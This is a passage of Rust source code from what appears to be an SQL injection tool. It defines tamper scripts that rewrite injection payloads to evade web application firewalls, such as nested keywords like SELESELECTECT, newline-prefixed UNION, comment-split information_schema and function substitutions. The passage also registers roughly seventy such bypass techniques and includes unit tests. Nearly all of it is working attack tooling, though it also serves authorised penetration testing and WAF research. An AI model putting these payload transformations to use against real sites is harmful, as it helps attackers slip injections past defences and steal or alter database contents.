        re.replace_all(payload, |caps: &regex::Captures| {
            format!("GET_LOCK('sqx',{})", &caps[1])
        }).to_string()
    }
}

/// Replace < with LEAST() equivalent.
pub struct TamperLeast;
impl TamperScript for TamperLeast {
    fn name(&self) -> &'static str { "least" }
    fn description(&self) -> &'static str { "Replace < comparisons with LEAST(): x<32 → LEAST(x,32)=LEAST(x,32) (operator filters)" }
    fn tamper(&self, payload: &str) -> String {
        // Replace common patterns like CHAR(x)<32 or n<32
        let re = regex::Regex::new(r"(\w+)<(\d+)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("LEAST({},{})={}", &caps[1], &caps[2], &caps[2])
        }).to_string()
    }
}

/// Non-recursive replacement: insert removable substring inside keyword.
/// WAFs that do single-pass keyword removal leave the real keyword behind.
pub struct TamperNonRecursiveReplacement;
impl TamperScript for TamperNonRecursiveReplacement {
    fn name(&self) -> &'static str { "nonrecursivereplacement" }
    fn description(&self) -> &'static str { "Embed removable marker inside keywords: SELESELECTECT (single-pass WAF removal)" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SELESELECTECT")
            .replace("UNION",  "UNIOUNIONNION")
            .replace("WHERE",  "WHERWHEREE")
            .replace("FROM",   "FRFROMOM")
            .replace("AND",    "AANDND")
    }
}

/// Add inline comment inside information_schema identifier.
pub struct TamperInformationSchemaComment;
impl TamperScript for TamperInformationSchemaComment {
    fn name(&self) -> &'static str { "informationschemacomment" }
    fn description(&self) -> &'static str { "Inject /**/ inside information_schema: information_schema/**/.tables" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("information_schema.tables",  "information_schema/**/.tables")
            .replace("information_schema.columns", "information_schema/**/.columns")
            .replace("information_schema.schemata","information_schema/**/.schemata")
    }
}

/// Prefix UNION with %0A (newline) to break line-based WAF parsers.
pub struct TamperMisUnion;
impl TamperScript for TamperMisUnion {
    fn name(&self) -> &'static str { "misunion" }
    fn description(&self) -> &'static str { "Prefix UNION with %0A newline: %0AUNION (line-split WAF parsers)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("UNION", "%0AUNION")
               .replace("union", "%0aunion")
    }
}

/// Escape quotes with backslash doubling (different from unmagicquotes).
pub struct TamperEscapeQuotes;
impl TamperScript for TamperEscapeQuotes {
    fn name(&self) -> &'static str { "escapequotes" }
    fn description(&self) -> &'static str { "Escape quotes with backslash: ' → \\\\' (double-escape for string context)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace('\'', "\\\\'").replace('"', "\\\\\"")
    }
}

/// IFNULL(a,b) → CASE WHEN ISNULL(a) THEN b END.
pub struct TamperIfNull2CaseWhenIsNull;
impl TamperScript for TamperIfNull2CaseWhenIsNull {
    fn name(&self) -> &'static str { "ifnull2casewhenisnull" }
    fn description(&self) -> &'static str { "IFNULL(a,b) → CASE WHEN ISNULL(a) THEN b END (MySQL IFNULL bypass)" }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),([^)]+)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("CASE WHEN ISNULL({}) THEN {} END", &caps[1], &caps[2])
        }).to_string()
    }
}

/// All built-in tamper scripts — replaces the old `WafBypass::all_techniques()`.
/// Duplicates (URL encode, space variants, etc.) are the single canonical version.
pub fn all_techniques() -> Vec<Box<dyn TamperScript>> {
    vec![
        // ── encoding ────────────────────────────────────────────────────────
        Box::new(TamperUrlEncode),
        Box::new(TamperDoubleUrlEncode),
        Box::new(TamperCharEncode),
        Box::new(TamperCharDoubleEncode),
        Box::new(TamperCharUnicodeEncode),
        Box::new(TamperUnicodeEscape),
        Box::new(TamperBase64Encode),
        Box::new(TamperOverlongUtf8),
        Box::new(TamperHexEncode),
        Box::new(TamperHtmlEncode),
        // ── quote bypass ────────────────────────────────────────────────────
        Box::new(TamperApostropheMask),
        Box::new(TamperApostropheNullEncode),
        Box::new(TamperUnMagicQuotes),
        // ── space substitution ───────────────────────────────────────────────
        Box::new(TamperSpaceToComment),
        Box::new(TamperSpaceToTab),
        Box::new(TamperSpaceToNewline),
        Box::new(TamperSpaceToWhitespaceMix),
        Box::new(TamperMultipleSpaces),
        Box::new(TamperBlueCoat),
        // ── keyword obfuscation ──────────────────────────────────────────────
        Box::new(TamperRandomCase),
        Box::new(TamperRandomComments),
        Box::new(TamperInlineComment),
        Box::new(TamperCaseCommentMix),
        Box::new(TamperDoubleKeyword),
        Box::new(TamperKeywordNewlineSplit),
        Box::new(TamperHexKeyword),
        // ── MySQL comment tricks ─────────────────────────────────────────────
        Box::new(TamperMySqlVersionComment),
        Box::new(TamperMySql50000Comment),
        Box::new(TamperVersionComment),
        Box::new(TamperVersionedKeywords),
        Box::new(TamperModSecurityZeroVersioned),
        // ── operator/function substitution ──────────────────────────────────
        Box::new(TamperEqualToLike),
        Box::new(TamperGreatest),
        Box::new(TamperBetweenOperator),
        Box::new(TamperLogicalOperators),
        Box::new(TamperSymbolicLogical),
        Box::new(TamperEquivalentFunctions),
        Box::new(TamperIfNull2IfIsNull),
        // ── MySQL syntax variants ────────────────────────────────────────────
        Box::new(TamperCommalessLimit),
        Box::new(TamperCommalessMid),
        Box::new(TamperConcat2ConcatWs),
        Box::new(TamperUnionAllToUnion),
        Box::new(TamperUnionSelectNospace),
        Box::new(TamperSleepToBenchmark),
        Box::new(TamperPlus2Concat),
        // ── ODBC / multi-backend ─────────────────────────────────────────────
        Box::new(TamperOdbcEscape),
        Box::new(TamperPlus2FnConcat),
        // ── MSSQL ────────────────────────────────────────────────────────────
        Box::new(TamperSpPassword),
        // ── misc ─────────────────────────────────────────────────────────────
        Box::new(TamperNullByte),
        Box::new(TamperScientificNotation),
        Box::new(TamperStringConcatBypass),
        Box::new(TamperBacktickIdentifiers),
        Box::new(TamperHppMarker),
        // ── additional 16 ────────────────────────────────────────────────────
        Box::new(TamperPercentage),
        Box::new(TamperSpace2Plus),
        Box::new(TamperSpace2Dash),
        Box::new(TamperSpace2Hash),
        Box::new(TamperSpace2MssqlHash),
        Box::new(TamperSpace2RandomBlank),
        Box::new(TamperSpace2MysqlBlank),
        Box::new(TamperLowercase),
        Box::new(TamperHalfVersionedMoreKeywords),
        Box::new(TamperSleep2GetLock),
        Box::new(TamperLeast),
        Box::new(TamperNonRecursiveReplacement),
        Box::new(TamperInformationSchemaComment),
        Box::new(TamperMisUnion),
        Box::new(TamperEscapeQuotes),
        Box::new(TamperIfNull2CaseWhenIsNull),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn t(script: &dyn TamperScript, input: &str) -> String {
        script.tamper(input)
    }

    #[test]
    fn test_space_variants() {
        assert_eq!(t(&TamperSpaceToComment, "SELECT 1"), "SELECT/**/1");
        assert_eq!(t(&TamperSpace2Plus, "SELECT 1"), "SELECT+1");
        assert_eq!(t(&TamperSpace2Dash, "SELECT 1"), "SELECT--%0a1");
        assert_eq!(t(&TamperSpace2Hash, "SELECT 1"), "SELECT#%0a1");
        assert_eq!(t(&TamperMultipleSpaces, "SELECT 1"), "SELECT   1");
    }

    #[test]
    fn test_encoding() {
        let out = t(&TamperCharEncode, "AB");
        assert_eq!(out, "%41%42");
        let out = t(&TamperCharDoubleEncode, "AB");
        assert_eq!(out, "%2541%2542");
        let out = t(&TamperApostropheMask, "'test'");
        assert_eq!(out, "%EF%BC%87test%EF%BC%87");
        let out = t(&TamperBase64Encode, "Man");
        assert_eq!(out, "TWFu"); // base64("Man") = TWFu
    }

    #[test]
    fn test_keyword_obfuscation() {
        let out = t(&TamperDoubleKeyword, "SELECT 1 FROM t WHERE 1=1");
        assert!(out.contains("SELSELECTECT"));
        let out = t(&TamperRandomCase, "SELECT");
        assert_eq!(out, "SeLeCt");
        let out = t(&TamperLowercase, "SELECT * FROM users");
        assert_eq!(out, "select * from users");
    }

    #[test]
    fn test_mysql_comments() {
        let out = t(&TamperMySqlVersionComment, "SELECT 1 UNION SELECT 2");
        assert!(out.contains("/*!SELECT*/"));
        assert!(out.contains("/*!UNION*/"));
        let out = t(&TamperModSecurityZeroVersioned, "SELECT 1 FROM t");
        assert!(out.contains("/*!00000SELECT*/"));
        assert!(out.contains("/*!00000FROM*/"));
        let out = t(&TamperHalfVersionedMoreKeywords, "SELECT 1");
        assert!(out.contains("/*!0SELECT*/"));
    }

    #[test]
    fn test_operator_substitution() {
        let out = t(&TamperEqualToLike, "WHERE id=1");
        assert!(out.contains("LIKE"));
        let out = t(&TamperSymbolicLogical, "1 AND 1 OR 0");
        assert!(out.contains("&&"));
        assert!(out.contains("||"));
    }

    #[test]
    fn test_mysql_syntax() {
        let out = t(&TamperCommalessLimit, "SELECT * FROM t LIMIT 0,10");
        assert_eq!(out, "SELECT * FROM t LIMIT 10 OFFSET 0");
        let out = t(&TamperCommalessMid, "MID(username,1,5)");
        assert_eq!(out, "MID(username FROM 1 FOR 5)");
        let out = t(&TamperSleep2GetLock, "SLEEP(5)");
        assert_eq!(out, "GET_LOCK('sqx',5)");
        let out = t(&TamperUnionAllToUnion, "UNION ALL SELECT 1,2");
        assert_eq!(out, "UNION SELECT 1,2");
    }

    #[test]
    fn test_ifnull_variants() {
        let out = t(&TamperIfNull2IfIsNull, "IFNULL(col,0)");
        assert_eq!(out, "IF(ISNULL(col),0,col)");
        let out = t(&TamperIfNull2CaseWhenIsNull, "IFNULL(col,0)");
        assert_eq!(out, "CASE WHEN ISNULL(col) THEN 0 END");
    }

    #[test]
    fn test_misc() {
        let out = t(&TamperMisUnion, "UNION SELECT 1");
        assert!(out.contains("%0AUNION"));
        let out = t(&TamperPercentage, "SEL");
        assert_eq!(out, "S%E%L");
        let out = t(&TamperInformationSchemaComment, "information_schema.tables");
        assert!(out.contains("/**/.tables"));
        let out = t(&TamperNonRecursiveReplacement, "SELECT 1");
        assert!(out.contains("SELESELECTECT"));
    }
}
